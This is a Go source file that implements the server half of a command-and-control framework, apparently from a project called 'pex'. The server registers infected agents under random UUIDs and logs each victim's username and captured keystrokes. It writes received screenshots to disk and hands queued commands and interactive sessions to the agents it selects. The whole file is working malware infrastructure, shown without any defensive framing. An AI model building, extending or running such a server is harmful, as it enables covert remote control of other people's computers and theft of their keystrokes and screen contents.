package c2

import (
	"bytes"
	"image"
	"image/png"
	"io"
	"log/slog"
	"net/http"
	"os"
	"time"

	"github.com/google/uuid"
	"github.com/hardal7/pex/internal/config"
)

func ServeHTTP() {
	root := http.NewServeMux()
	root.Handle("/", http.HandlerFunc(requestHandler()))

	server := http.Server{
		Addr:    ":" + config.BeaconPort,
		Handler: root,
	}
	slog.Info("Starting server on port: " + config.BeaconPort)
	err := server.ListenAndServe()
	if err != nil {
		slog.Error("Failed to start server: " + err.Error())
	}
}

func requestHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Register") == "true" {
			uuid, _ := uuid.NewRandom()
			w.Write([]byte(uuid.String()))
			mu.Lock()
			state.RegisteredAgents = append(state.RegisteredAgents, uuid.String())
			mu.Unlock()
			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
		} else if r.Header.Get("UUID") == state.SelectedAgent || "ALL" == state.SelectedAgent {
			slog.Info("Connected Agent: \n")
			slog.Info("Address: " + r.RemoteAddr)
			slog.Info("Username: " + r.Header.Get("Username"))
			if r.Header.Get("Keys") != "" {
				slog.Info("Keys Pressed: " + r.Header.Get("Keys"))
			}
			response, err := io.ReadAll(r.Body)
			if err != nil {
				slog.Error("Failed reading request body: " + err.Error())
				return
			}

			if r.Header.Get("Content-Type") == "image/png" {
				slog.Info("Received response with image")
				image, _, _ := image.Decode(bytes.NewReader(response))
				out, err := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
				if err != nil {
					slog.Info("Failed creating image file")
				}
				defer out.Close()
				png.Encode(out, image)
			} else if string(response) != "" {
				slog.Info("Received response:\n" + string(response))
			}
			if len(state.Tasks) != 0 {
				if state.Tasks[0].Command == "SESSION" {
					slog.Info("Initiating session")
					go InitiateSession()
					state.Tasks = state.Tasks[1:]
				}
				requestCommand(w, r)
			}
		} else {
			w.Write([]byte(""))
			slog.Info("Pinged agent: " + r.RemoteAddr)
		}
	}
}

func requestCommand(w http.ResponseWriter, r *http.Request) {
	if len(state.Tasks) != 0 {
		if state.Tasks[0].Command != "" && state.Tasks[0].Agent == r.Header.Get("UUID") {
			w.Write([]byte(state.Tasks[0].Command))
			slog.Info("Command requested: " + state.Tasks[0].Command)
			state.Tasks = state.Tasks[1:]
		}
	} else {
		w.Write([]byte(""))
		slog.Info("Pinged agent")
	}
}
